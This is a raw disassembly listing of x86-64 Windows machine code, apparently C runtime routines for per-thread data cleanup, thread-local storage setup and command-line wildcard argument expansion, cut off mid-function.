   140004ee2:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   140004ee6:	48 8d 55 28          	lea    0x28(%rbp),%rdx
   140004eea:	66 89 88 bc 00 00 00 	mov    %cx,0xbc(%rax)
   140004ef1:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   140004ef5:	66 89 88 c2 01 00 00 	mov    %cx,0x1c2(%rax)
   140004efc:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140004f00:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   140004f04:	48 83 a0 a0 03 00 00 	andq   $0x0,0x3a0(%rax)
   140004f0b:	00 
   140004f0c:	e8 cf fe ff ff       	call   0x140004de0
   140004f11:	4c 8d 4d d0          	lea    -0x30(%rbp),%r9
   140004f15:	4c 8d 45 f0          	lea    -0x10(%rbp),%r8
   140004f19:	48 8d 55 d4          	lea    -0x2c(%rbp),%rdx
   140004f1d:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140004f21:	e8 72 fe ff ff       	call   0x140004d98
   140004f26:	48 83 c4 50          	add    $0x50,%rsp
   140004f2a:	5d                   	pop    %rbp
   140004f2b:	c3                   	ret
   140004f2c:	90                   	nop
   140004f2d:	90                   	nop
   140004f2e:	90                   	nop
   140004f2f:	90                   	nop
   140004f30:	48 85 c9             	test   %rcx,%rcx
   140004f33:	74 1a                	je     0x140004f4f
   140004f35:	53                   	push   %rbx
   140004f36:	48 83 ec 20          	sub    $0x20,%rsp
   140004f3a:	48 8b d9             	mov    %rcx,%rbx
   140004f3d:	e8 0e 00 00 00       	call   0x140004f50
   140004f42:	48 8b cb             	mov    %rbx,%rcx
   140004f45:	e8 f6 f7 ff ff       	call   0x140004740
   140004f4a:	48 83 c4 20          	add    $0x20,%rsp
   140004f4e:	5b                   	pop    %rbx
   140004f4f:	c3                   	ret
   140004f50:	55                   	push   %rbp
   140004f51:	48 8b ec             	mov    %rsp,%rbp
   140004f54:	48 83 ec 40          	sub    $0x40,%rsp
   140004f58:	48 8d 45 e8          	lea    -0x18(%rbp),%rax
   140004f5c:	48 89 4d e8          	mov    %rcx,-0x18(%rbp)
   140004f60:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140004f64:	48 8d 15 25 76 00 00 	lea    0x7625(%rip),%rdx        # 0x14000c590
   140004f6b:	b8 05 00 00 00       	mov    $0x5,%eax
   140004f70:	89 45 20             	mov    %eax,0x20(%rbp)
   140004f73:	89 45 28             	mov    %eax,0x28(%rbp)
   140004f76:	48 8d 45 e8          	lea    -0x18(%rbp),%rax
   140004f7a:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140004f7e:	b8 04 00 00 00       	mov    $0x4,%eax
   140004f83:	89 45 e0             	mov    %eax,-0x20(%rbp)
   140004f86:	89 45 e4             	mov    %eax,-0x1c(%rbp)
   140004f89:	48 8b 01             	mov    (%rcx),%rax
   140004f8c:	48 3b c2             	cmp    %rdx,%rax
   140004f8f:	74 0c                	je     0x140004f9d
   140004f91:	48 8b c8             	mov    %rax,%rcx
   140004f94:	e8 a7 f7 ff ff       	call   0x140004740
   140004f99:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140004f9d:	48 8b 49 70          	mov    0x70(%rcx),%rcx
   140004fa1:	e8 9a f7 ff ff       	call   0x140004740
   140004fa6:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140004faa:	48 8b 49 58          	mov    0x58(%rcx),%rcx
   140004fae:	e8 8d f7 ff ff       	call   0x140004740
   140004fb3:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140004fb7:	48 8b 49 60          	mov    0x60(%rcx),%rcx
   140004fbb:	e8 80 f7 ff ff       	call   0x140004740
   140004fc0:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140004fc4:	48 8b 49 68          	mov    0x68(%rcx),%rcx
   140004fc8:	e8 73 f7 ff ff       	call   0x140004740
   140004fcd:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140004fd1:	48 8b 49 48          	mov    0x48(%rcx),%rcx
   140004fd5:	e8 66 f7 ff ff       	call   0x140004740
   140004fda:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140004fde:	48 8b 49 50          	mov    0x50(%rcx),%rcx
   140004fe2:	e8 59 f7 ff ff       	call   0x140004740
   140004fe7:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140004feb:	48 8b 49 78          	mov    0x78(%rcx),%rcx
   140004fef:	e8 4c f7 ff ff       	call   0x140004740
   140004ff4:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140004ff8:	48 8b 89 80 00 00 00 	mov    0x80(%rcx),%rcx
   140004fff:	e8 3c f7 ff ff       	call   0x140004740
   140005004:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140005008:	48 8b 89 c0 03 00 00 	mov    0x3c0(%rcx),%rcx
   14000500f:	e8 2c f7 ff ff       	call   0x140004740
   140005014:	4c 8d 4d 20          	lea    0x20(%rbp),%r9
   140005018:	4c 8d 45 f0          	lea    -0x10(%rbp),%r8
   14000501c:	48 8d 55 28          	lea    0x28(%rbp),%rdx
   140005020:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140005024:	e8 0f fd ff ff       	call   0x140004d38
   140005029:	4c 8d 4d e0          	lea    -0x20(%rbp),%r9
   14000502d:	4c 8d 45 f8          	lea    -0x8(%rbp),%r8
   140005031:	48 8d 55 e4          	lea    -0x1c(%rbp),%rdx
   140005035:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140005039:	e8 e2 fd ff ff       	call   0x140004e20
   14000503e:	48 83 c4 40          	add    $0x40,%rsp
   140005042:	5d                   	pop    %rbp
   140005043:	c3                   	ret
   140005044:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005049:	57                   	push   %rdi
   14000504a:	48 83 ec 20          	sub    $0x20,%rsp
   14000504e:	48 8b f9             	mov    %rcx,%rdi
   140005051:	48 8b da             	mov    %rdx,%rbx
   140005054:	48 8b 89 90 00 00 00 	mov    0x90(%rcx),%rcx
   14000505b:	48 85 c9             	test   %rcx,%rcx
   14000505e:	74 2c                	je     0x14000508c
   140005060:	e8 43 27 00 00       	call   0x1400077a8
   140005065:	48 8b 8f 90 00 00 00 	mov    0x90(%rdi),%rcx
   14000506c:	48 3b 0d a5 19 01 00 	cmp    0x119a5(%rip),%rcx        # 0x140016a18
   140005073:	74 17                	je     0x14000508c
   140005075:	48 8d 05 74 05 01 00 	lea    0x10574(%rip),%rax        # 0x1400155f0
   14000507c:	48 3b c8             	cmp    %rax,%rcx
   14000507f:	74 0b                	je     0x14000508c
   140005081:	83 79 10 00          	cmpl   $0x0,0x10(%rcx)
   140005085:	75 05                	jne    0x14000508c
   140005087:	e8 18 25 00 00       	call   0x1400075a4
   14000508c:	48 89 9f 90 00 00 00 	mov    %rbx,0x90(%rdi)
   140005093:	48 85 db             	test   %rbx,%rbx
   140005096:	74 08                	je     0x1400050a0
   140005098:	48 8b cb             	mov    %rbx,%rcx
   14000509b:	e8 78 24 00 00       	call   0x140007518
   1400050a0:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400050a5:	48 83 c4 20          	add    $0x20,%rsp
   1400050a9:	5f                   	pop    %rdi
   1400050aa:	c3                   	ret
   1400050ab:	90                   	nop
   1400050ac:	90                   	nop
   1400050ad:	90                   	nop
   1400050ae:	90                   	nop
   1400050af:	90                   	nop
   1400050b0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400050b5:	57                   	push   %rdi
   1400050b6:	48 83 ec 20          	sub    $0x20,%rsp
   1400050ba:	ff 15 40 6f 00 00    	call   *0x6f40(%rip)        # 0x14000c000
   1400050c0:	8b 0d da ff 00 00    	mov    0xffda(%rip),%ecx        # 0x1400150a0
   1400050c6:	8b d8                	mov    %eax,%ebx
   1400050c8:	83 f9 ff             	cmp    $0xffffffff,%ecx
   1400050cb:	74 0d                	je     0x1400050da
   1400050cd:	e8 6a 16 00 00       	call   0x14000673c
   1400050d2:	48 8b f8             	mov    %rax,%rdi
   1400050d5:	48 85 c0             	test   %rax,%rax
   1400050d8:	75 41                	jne    0x14000511b
   1400050da:	ba c8 03 00 00       	mov    $0x3c8,%edx
   1400050df:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400050e4:	e8 4f f7 ff ff       	call   0x140004838
   1400050e9:	48 8b f8             	mov    %rax,%rdi
   1400050ec:	48 85 c0             	test   %rax,%rax
   1400050ef:	75 09                	jne    0x1400050fa
   1400050f1:	33 c9                	xor    %ecx,%ecx
   1400050f3:	e8 48 f6 ff ff       	call   0x140004740
   1400050f8:	eb 3c                	jmp    0x140005136
   1400050fa:	8b 0d a0 ff 00 00    	mov    0xffa0(%rip),%ecx        # 0x1400150a0
   140005100:	48 8b d0             	mov    %rax,%rdx
   140005103:	e8 8c 16 00 00       	call   0x140006794
   140005108:	48 8b cf             	mov    %rdi,%rcx
   14000510b:	85 c0                	test   %eax,%eax
   14000510d:	74 e4                	je     0x1400050f3
   14000510f:	e8 4c fd ff ff       	call   0x140004e60
   140005114:	33 c9                	xor    %ecx,%ecx
   140005116:	e8 25 f6 ff ff       	call   0x140004740
   14000511b:	48 85 ff             	test   %rdi,%rdi
   14000511e:	74 16                	je     0x140005136
   140005120:	8b cb                	mov    %ebx,%ecx
   140005122:	ff 15 e0 6e 00 00    	call   *0x6ee0(%rip)        # 0x14000c008
   140005128:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000512d:	48 8b c7             	mov    %rdi,%rax
   140005130:	48 83 c4 20          	add    $0x20,%rsp
   140005134:	5f                   	pop    %rdi
   140005135:	c3                   	ret
   140005136:	8b cb                	mov    %ebx,%ecx
   140005138:	ff 15 ca 6e 00 00    	call   *0x6eca(%rip)        # 0x14000c008
   14000513e:	e8 9d f6 ff ff       	call   0x1400047e0
   140005143:	cc                   	int3
   140005144:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005149:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000514e:	57                   	push   %rdi
   14000514f:	48 83 ec 20          	sub    $0x20,%rsp
   140005153:	ff 15 a7 6e 00 00    	call   *0x6ea7(%rip)        # 0x14000c000
   140005159:	8b 0d 41 ff 00 00    	mov    0xff41(%rip),%ecx        # 0x1400150a0
   14000515f:	33 f6                	xor    %esi,%esi
   140005161:	8b d8                	mov    %eax,%ebx
   140005163:	83 f9 ff             	cmp    $0xffffffff,%ecx
   140005166:	74 0d                	je     0x140005175
   140005168:	e8 cf 15 00 00       	call   0x14000673c
   14000516d:	48 8b f8             	mov    %rax,%rdi
   140005170:	48 85 c0             	test   %rax,%rax
   140005173:	75 41                	jne    0x1400051b6
   140005175:	ba c8 03 00 00       	mov    $0x3c8,%edx
   14000517a:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000517f:	e8 b4 f6 ff ff       	call   0x140004838
   140005184:	48 8b f8             	mov    %rax,%rdi
   140005187:	48 85 c0             	test   %rax,%rax
   14000518a:	75 09                	jne    0x140005195
   14000518c:	33 c9                	xor    %ecx,%ecx
   14000518e:	e8 ad f5 ff ff       	call   0x140004740
   140005193:	eb 26                	jmp    0x1400051bb
   140005195:	8b 0d 05 ff 00 00    	mov    0xff05(%rip),%ecx        # 0x1400150a0
   14000519b:	48 8b d0             	mov    %rax,%rdx
   14000519e:	e8 f1 15 00 00       	call   0x140006794
   1400051a3:	48 8b cf             	mov    %rdi,%rcx
   1400051a6:	85 c0                	test   %eax,%eax
   1400051a8:	74 e4                	je     0x14000518e
   1400051aa:	e8 b1 fc ff ff       	call   0x140004e60
   1400051af:	33 c9                	xor    %ecx,%ecx
   1400051b1:	e8 8a f5 ff ff       	call   0x140004740
   1400051b6:	48 85 ff             	test   %rdi,%rdi
   1400051b9:	75 0a                	jne    0x1400051c5
   1400051bb:	8b cb                	mov    %ebx,%ecx
   1400051bd:	ff 15 45 6e 00 00    	call   *0x6e45(%rip)        # 0x14000c008
   1400051c3:	eb 0b                	jmp    0x1400051d0
   1400051c5:	8b cb                	mov    %ebx,%ecx
   1400051c7:	ff 15 3b 6e 00 00    	call   *0x6e3b(%rip)        # 0x14000c008
   1400051cd:	48 8b f7             	mov    %rdi,%rsi
   1400051d0:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400051d5:	48 8b c6             	mov    %rsi,%rax
   1400051d8:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400051dd:	48 83 c4 20          	add    $0x20,%rsp
   1400051e1:	5f                   	pop    %rdi
   1400051e2:	c3                   	ret
   1400051e3:	90                   	nop
   1400051e4:	48 83 ec 28          	sub    $0x28,%rsp
   1400051e8:	48 8d 0d 41 fd ff ff 	lea    -0x2bf(%rip),%rcx        # 0x140004f30
   1400051ef:	e8 98 14 00 00       	call   0x14000668c
   1400051f4:	89 05 a6 fe 00 00    	mov    %eax,0xfea6(%rip)        # 0x1400150a0
   1400051fa:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400051fd:	75 04                	jne    0x140005203
   1400051ff:	32 c0                	xor    %al,%al
   140005201:	eb 15                	jmp    0x140005218
   140005203:	e8 3c ff ff ff       	call   0x140005144
   140005208:	48 85 c0             	test   %rax,%rax
   14000520b:	75 09                	jne    0x140005216
   14000520d:	33 c9                	xor    %ecx,%ecx
   14000520f:	e8 0c 00 00 00       	call   0x140005220
   140005214:	eb e9                	jmp    0x1400051ff
   140005216:	b0 01                	mov    $0x1,%al
   140005218:	48 83 c4 28          	add    $0x28,%rsp
   14000521c:	c3                   	ret
   14000521d:	90                   	nop
   14000521e:	90                   	nop
   14000521f:	90                   	nop
   140005220:	48 83 ec 28          	sub    $0x28,%rsp
   140005224:	8b 0d 76 fe 00 00    	mov    0xfe76(%rip),%ecx        # 0x1400150a0
   14000522a:	83 f9 ff             	cmp    $0xffffffff,%ecx
   14000522d:	74 0c                	je     0x14000523b
   14000522f:	e8 b0 14 00 00       	call   0x1400066e4
   140005234:	83 0d 65 fe 00 00 ff 	orl    $0xffffffff,0xfe65(%rip)        # 0x1400150a0
   14000523b:	b0 01                	mov    $0x1,%al
   14000523d:	48 83 c4 28          	add    $0x28,%rsp
   140005241:	c3                   	ret
   140005242:	90                   	nop
   140005243:	90                   	nop
   140005244:	48 3b ca             	cmp    %rdx,%rcx
   140005247:	73 04                	jae    0x14000524d
   140005249:	83 c8 ff             	or     $0xffffffff,%eax
   14000524c:	c3                   	ret
   14000524d:	33 c0                	xor    %eax,%eax
   14000524f:	48 3b ca             	cmp    %rdx,%rcx
   140005252:	0f 97 c0             	seta   %al
   140005255:	c3                   	ret
   140005256:	90                   	nop
   140005257:	90                   	nop
   140005258:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000525d:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140005262:	55                   	push   %rbp
   140005263:	56                   	push   %rsi
   140005264:	57                   	push   %rdi
   140005265:	41 54                	push   %r12
   140005267:	41 55                	push   %r13
   140005269:	41 56                	push   %r14
   14000526b:	41 57                	push   %r15
   14000526d:	48 8b ec             	mov    %rsp,%rbp
   140005270:	48 83 ec 60          	sub    $0x60,%rsp
   140005274:	33 ff                	xor    %edi,%edi
   140005276:	48 8b d9             	mov    %rcx,%rbx
   140005279:	48 85 d2             	test   %rdx,%rdx
   14000527c:	75 16                	jne    0x140005294
   14000527e:	e8 6d fa ff ff       	call   0x140004cf0
   140005283:	8d 5f 16             	lea    0x16(%rdi),%ebx
   140005286:	89 18                	mov    %ebx,(%rax)
   140005288:	e8 43 f9 ff ff       	call   0x140004bd0
   14000528d:	8b c3                	mov    %ebx,%eax
   14000528f:	e9 a0 01 00 00       	jmp    0x140005434
   140005294:	0f 57 c0             	xorps  %xmm0,%xmm0
   140005297:	48 89 3a             	mov    %rdi,(%rdx)
   14000529a:	48 39 39             	cmp    %rdi,(%rcx)
   14000529d:	f3 0f 7f 45 e0       	movdqu %xmm0,-0x20(%rbp)
   1400052a2:	48 89 7d f0          	mov    %rdi,-0x10(%rbp)
   1400052a6:	74 57                	je     0x1400052ff
   1400052a8:	48 8b 0b             	mov    (%rbx),%rcx
   1400052ab:	48 8d 55 50          	lea    0x50(%rbp),%rdx
   1400052af:	66 c7 45 50 2a 3f    	movw   $0x3f2a,0x50(%rbp)
   1400052b5:	40 88 7d 52          	mov    %dil,0x52(%rbp)
   1400052b9:	e8 ea 33 00 00       	call   0x1400086a8
   1400052be:	48 8b 0b             	mov    (%rbx),%rcx
   1400052c1:	48 85 c0             	test   %rax,%rax
   1400052c4:	75 10                	jne    0x1400052d6
   1400052c6:	4c 8d 4d e0          	lea    -0x20(%rbp),%r9
   1400052ca:	45 33 c0             	xor    %r8d,%r8d
   1400052cd:	33 d2                	xor    %edx,%edx
   1400052cf:	e8 90 01 00 00       	call   0x140005464
   1400052d4:	eb 0c                	jmp    0x1400052e2
   1400052d6:	4c 8d 45 e0          	lea    -0x20(%rbp),%r8
   1400052da:	48 8b d0             	mov    %rax,%rdx
   1400052dd:	e8 92 02 00 00       	call   0x140005574
   1400052e2:	44 8b f0             	mov    %eax,%r14d
   1400052e5:	85 c0                	test   %eax,%eax
   1400052e7:	75 09                	jne    0x1400052f2
   1400052e9:	48 83 c3 08          	add    $0x8,%rbx
   1400052ed:	48 39 3b             	cmp    %rdi,(%rbx)
   1400052f0:	eb b4                	jmp    0x1400052a6
   1400052f2:	4c 8b 65 e8          	mov    -0x18(%rbp),%r12
   1400052f6:	48 8b 75 e0          	mov    -0x20(%rbp),%rsi
   1400052fa:	e9 f9 00 00 00       	jmp    0x1400053f8
   1400052ff:	48 8b 75 e0          	mov    -0x20(%rbp),%rsi
   140005303:	4c 8b cf             	mov    %rdi,%r9
   140005306:	4c 8b 65 e8          	mov    -0x18(%rbp),%r12
   14000530a:	48 8b d6             	mov    %rsi,%rdx
   14000530d:	49 8b c4             	mov    %r12,%rax
   140005310:	48 89 7d 50          	mov    %rdi,0x50(%rbp)
   140005314:	48 2b c6             	sub    %rsi,%rax
   140005317:	4c 8b c7             	mov    %rdi,%r8
   14000531a:	4c 8b f8             	mov    %rax,%r15
   14000531d:	49 c1 ff 03          	sar    $0x3,%r15
   140005321:	49 ff c7             	inc    %r15
   140005324:	48 8d 48 07          	lea    0x7(%rax),%rcx
   140005328:	48 c1 e9 03          	shr    $0x3,%rcx
   14000532c:	49 3b f4             	cmp    %r12,%rsi
   14000532f:	48 0f 47 cf          	cmova  %rdi,%rcx
   140005333:	49 83 ce ff          	or     $0xffffffffffffffff,%r14
   140005337:	48 85 c9             	test   %rcx,%rcx
   14000533a:	74 25                	je     0x140005361
   14000533c:	4c 8b 12             	mov    (%rdx),%r10
   14000533f:	49 8b c6             	mov    %r14,%rax
   140005342:	48 ff c0             	inc    %rax
   140005345:	41 38 3c 02          	cmp    %dil,(%r10,%rax,1)
   140005349:	75 f7                	jne    0x140005342
   14000534b:	49 ff c1             	inc    %r9
   14000534e:	48 83 c2 08          	add    $0x8,%rdx
   140005352:	4c 03 c8             	add    %rax,%r9
   140005355:	49 ff c0             	inc    %r8
   140005358:	4c 3b c1             	cmp    %rcx,%r8
   14000535b:	75 df                	jne    0x14000533c
   14000535d:	4c 89 4d 50          	mov    %r9,0x50(%rbp)
   140005361:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140005367:	49 8b d1             	mov    %r9,%rdx
   14000536a:	49 8b cf             	mov    %r15,%rcx
   14000536d:	e8 36 e4 ff ff       	call   0x1400037a8
   140005372:	48 8b d8             	mov    %rax,%rbx
   140005375:	48 85 c0             	test   %rax,%rax
   140005378:	74 77                	je     0x1400053f1
   14000537a:	4a 8d 14 f8          	lea    (%rax,%r15,8),%rdx
   14000537e:	4c 8b fe             	mov    %rsi,%r15
   140005381:	48 89 55 d8          	mov    %rdx,-0x28(%rbp)
   140005385:	48 8b c2             	mov    %rdx,%rax
   140005388:	48 89 55 58          	mov    %rdx,0x58(%rbp)
   14000538c:	49 3b f4             	cmp    %r12,%rsi
   14000538f:	74 56                	je     0x1400053e7
   140005391:	48 8b cb             	mov    %rbx,%rcx
   140005394:	48 2b ce             	sub    %rsi,%rcx
   140005397:	48 89 4d d0          	mov    %rcx,-0x30(%rbp)
   14000539b:	4d 8b 07             	mov    (%r15),%r8
   14000539e:	4d 8b ee             	mov    %r14,%r13
   1400053a1:	49 ff c5             	inc    %r13
   1400053a4:	43 38 3c 28          	cmp    %dil,(%r8,%r13,1)
   1400053a8:	75 f7                	jne    0x1400053a1
   1400053aa:	48 2b d0             	sub    %rax,%rdx
   1400053ad:	49 ff c5             	inc    %r13
   1400053b0:	48 03 55 50          	add    0x50(%rbp),%rdx
   1400053b4:	4d 8b cd             	mov    %r13,%r9
   1400053b7:	48 8b c8             	mov    %rax,%rcx
   1400053ba:	e8 15 32 00 00       	call   0x1400085d4
   1400053bf:	85 c0                	test   %eax,%eax
   1400053c1:	0f 85 85 00 00 00    	jne    0x14000544c
   1400053c7:	48 8b 45 58          	mov    0x58(%rbp),%rax
   1400053cb:	48 8b 4d d0          	mov    -0x30(%rbp),%rcx
   1400053cf:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
   1400053d3:	4a 89 04 39          	mov    %rax,(%rcx,%r15,1)
   1400053d7:	49 03 c5             	add    %r13,%rax
   1400053da:	49 83 c7 08          	add    $0x8,%r15
   1400053de:	48 89 45 58          	mov    %rax,0x58(%rbp)
   1400053e2:	4d 3b fc             	cmp    %r12,%r15
   1400053e5:	75 b4                	jne    0x14000539b
   1400053e7:	48 8b 45 48          	mov    0x48(%rbp),%rax
   1400053eb:	44 8b f7             	mov    %edi,%r14d
   1400053ee:	48 89 18             	mov    %rbx,(%rax)
   1400053f1:	33 c9                	xor    %ecx,%ecx
   1400053f3:	e8 48 f3 ff ff       	call   0x140004740
   1400053f8:	49 8b dc             	mov    %r12,%rbx
   1400053fb:	4c 8b fe             	mov    %rsi,%r15
   1400053fe:	48 2b de             	sub    %rsi,%rbx
   140005401:	48 83 c3 07          	add    $0x7,%rbx
   140005405:	48 c1 eb 03          	shr    $0x3,%rbx
   140005409:	49 3b f4             	cmp    %r12,%rsi
   14000540c:	48 0f 47 df          	cmova  %rdi,%rbx
   140005410:	48 85 db             	test   %rbx,%rbx
   140005413:	74 14                	je     0x140005429
   140005415:	49 8b 0f             	mov    (%r15),%rcx
   140005418:	e8 23 f3 ff ff       	call   0x140004740
   14000541d:	48 ff c7             	inc    %rdi
   140005420:	4d 8d 7f 08          	lea    0x8(%r15),%r15
   140005424:	48 3b fb             	cmp    %rbx,%rdi
   140005427:	75 ec                	jne    0x140005415
   140005429:	48 8b ce             	mov    %rsi,%rcx
   14000542c:	e8 0f f3 ff ff       	call   0x140004740
   140005431:	41 8b c6             	mov    %r14d,%eax
   140005434:	48 8b 9c 24 a0 00 00 	mov    0xa0(%rsp),%rbx
   14000543b:	00 
   14000543c:	48 83 c4 60          	add    $0x60,%rsp
   140005440:	41 5f                	pop    %r15
   140005442:	41 5e                	pop    %r14
   140005444:	41 5d                	pop    %r13
   140005446:	41 5c                	pop    %r12
   140005448:	5f                   	pop    %rdi
   140005449:	5e                   	pop    %rsi
   14000544a:	5d                   	pop    %rbp
   14000544b:	c3                   	ret
   14000544c:	45 33 c9             	xor    %r9d,%r9d
   14000544f:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140005454:	45 33 c0             	xor    %r8d,%r8d
   140005457:	33 d2                	xor    %edx,%edx
   140005459:	33 c9                	xor    %ecx,%ecx
   14000545b:	e8 90 f7 ff ff       	call   0x140004bf0
   140005460:	cc                   	int3
   140005461:	90                   	nop
   140005462:	90                   	nop
   140005463:	90                   	nop
   140005464:	48 8b c4             	mov    %rsp,%rax
   140005467:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000546b:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000546f:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140005473:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140005477:	41 54                	push   %r12
   140005479:	41 56                	push   %r14
   14000547b:	41 57                	push   %r15
   14000547d:	48 83 ec 30          	sub    $0x30,%rsp
   140005481:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140005485:	49 8b f1             	mov    %r9,%rsi
   140005488:	48 8b f8             	mov    %rax,%rdi
   14000548b:	49 8b e8             	mov    %r8,%rbp
   14000548e:	4c 8b e2             	mov    %rdx,%r12
   140005491:	4c 8b f9             	mov    %rcx,%r15
   140005494:	48 ff c7             	inc    %rdi
   140005497:	80 3c 39 00          	cmpb   $0x0,(%rcx,%rdi,1)
   14000549b:	75 f7                	jne    0x140005494
   14000549d:	ba 01 00 00 00       	mov    $0x1,%edx
   1400054a2:	49 2b c0             	sub    %r8,%rax
   1400054a5:	48 03 fa             	add    %rdx,%rdi
   1400054a8:	48 3b f8             	cmp    %rax,%rdi
   1400054ab:	76 22                	jbe    0x1400054cf
   1400054ad:	8d 42 0b             	lea    0xb(%rdx),%eax
   1400054b0:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   1400054b5:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   1400054ba:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   1400054bf:	48 8b 7c 24 68       	mov    0x68(%rsp),%rdi
   1400054c4:	48 83 c4 30          	add    $0x30,%rsp
   1400054c8:	41 5f                	pop    %r15
   1400054ca:	41 5e                	pop    %r14
   1400054cc:	41 5c                	pop    %r12
   1400054ce:	c3                   	ret
   1400054cf:	4d 8d 70 01          	lea    0x1(%r8),%r14
   1400054d3:	4c 03 f7             	add    %rdi,%r14
   1400054d6:	49 8b ce             	mov    %r14,%rcx
   1400054d9:	e8 5a f3 ff ff       	call   0x140004838
   1400054de:	48 8b d8             	mov    %rax,%rbx
   1400054e1:	48 85 ed             	test   %rbp,%rbp
   1400054e4:	74 15                	je     0x1400054fb
   1400054e6:	4c 8b cd             	mov    %rbp,%r9
   1400054e9:	4d 8b c4             	mov    %r12,%r8
   1400054ec:	49 8b d6             	mov    %r14,%rdx
   1400054ef:	48 8b c8             	mov    %rax,%rcx
   1400054f2:	e8 dd 30 00 00       	call   0x1400085d4
   1400054f7:	85 c0                	test   %eax,%eax
   1400054f9:	75 4d                	jne    0x140005548
   1400054fb:	4c 2b f5             	sub    %rbp,%r14
   1400054fe:	48 8d 0c 2b          	lea    (%rbx,%rbp,1),%rcx
   140005502:	49 8b d6             	mov    %r14,%rdx
   140005505:	4c 8b cf             	mov    %rdi,%r9
   140005508:	4d 8b c7             	mov    %r15,%r8
   14000550b:	e8 c4 30 00 00       	call   0x1400085d4
   140005510:	85 c0                	test   %eax,%eax
   140005512:	75 4a                	jne    0x14000555e
   140005514:	48 8b ce             	mov    %rsi,%rcx
   140005517:	e8 04 02 00 00       	call   0x140005720
   14000551c:	8b f8                	mov    %eax,%edi
   14000551e:	85 c0                	test   %eax,%eax
   140005520:	74 0a                	je     0x14000552c
   140005522:	48 8b cb             	mov    %rbx,%rcx
   140005525:	e8 16 f2 ff ff       	call   0x140004740
   14000552a:	eb 0e                	jmp    0x14000553a
   14000552c:	48 8b 46 08          	mov    0x8(%rsi),%rax
   140005530:	48 89 18             	mov    %rbx,(%rax)
   140005533:	48 83 46 08 08       	addq   $0x8,0x8(%rsi)
   140005538:	33 ff                	xor    %edi,%edi
   14000553a:	33 c9                	xor    %ecx,%ecx
   14000553c:	e8 ff f1 ff ff       	call   0x140004740
   140005541:	8b c7                	mov    %edi,%eax
   140005543:	e9 68 ff ff ff       	jmp    0x1400054b0
   140005548:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000554e:	45 33 c9             	xor    %r9d,%r9d
   140005551:	45 33 c0             	xor    %r8d,%r8d
   140005554:	33 d2                	xor    %edx,%edx
   140005556:	33 c9                	xor    %ecx,%ecx
   140005558:	e8 93 f6 ff ff       	call   0x140004bf0
   14000555d:	cc                   	int3
   14000555e:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140005564:	45 33 c9             	xor    %r9d,%r9d
   140005567:	45 33 c0             	xor    %r8d,%r8d
   14000556a:	33 d2                	xor    %edx,%edx
   14000556c:	33 c9                	xor    %ecx,%ecx
   14000556e:	e8 7d f6 ff ff       	call   0x140004bf0
   140005573:	cc                   	int3
   140005574:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140005579:	55                   	push   %rbp
   14000557a:	56                   	push   %rsi
   14000557b:	57                   	push   %rdi
   14000557c:	41 56                	push   %r14
   14000557e:	41 57                	push   %r15
   140005580:	48 81 ec 80 01 00 00 	sub    $0x180,%rsp
   140005587:	48 8b 05 8a fa 00 00 	mov    0xfa8a(%rip),%rax        # 0x140015018
   14000558e:	48 33 c4             	xor    %rsp,%rax
   140005591:	48 89 84 24 70 01 00 	mov    %rax,0x170(%rsp)
   140005598:	00 
   140005599:	4d 8b f0             	mov    %r8,%r14
   14000559c:	48 8b f1             	mov    %rcx,%rsi
   14000559f:	48 bb 01 08 00 00 00 	movabs $0x200000000801,%rbx
   1400055a6:	20 00 00 
   1400055a9:	48 3b d1             	cmp    %rcx,%rdx
   1400055ac:	74 22                	je     0x1400055d0
   1400055ae:	8a 02                	mov    (%rdx),%al
   1400055b0:	2c 2f                	sub    $0x2f,%al
   1400055b2:	3c 2d                	cmp    $0x2d,%al
   1400055b4:	77 0a                	ja     0x1400055c0
   1400055b6:	48 0f be c0          	movsbq %al,%rax
   1400055ba:	48 0f a3 c3          	bt     %rax,%rbx
   1400055be:	72 10                	jb     0x1400055d0
   1400055c0:	48 8b ce             	mov    %rsi,%rcx
   1400055c3:	e8 80 31 00 00       	call   0x140008748
   1400055c8:	48 8b d0             	mov    %rax,%rdx
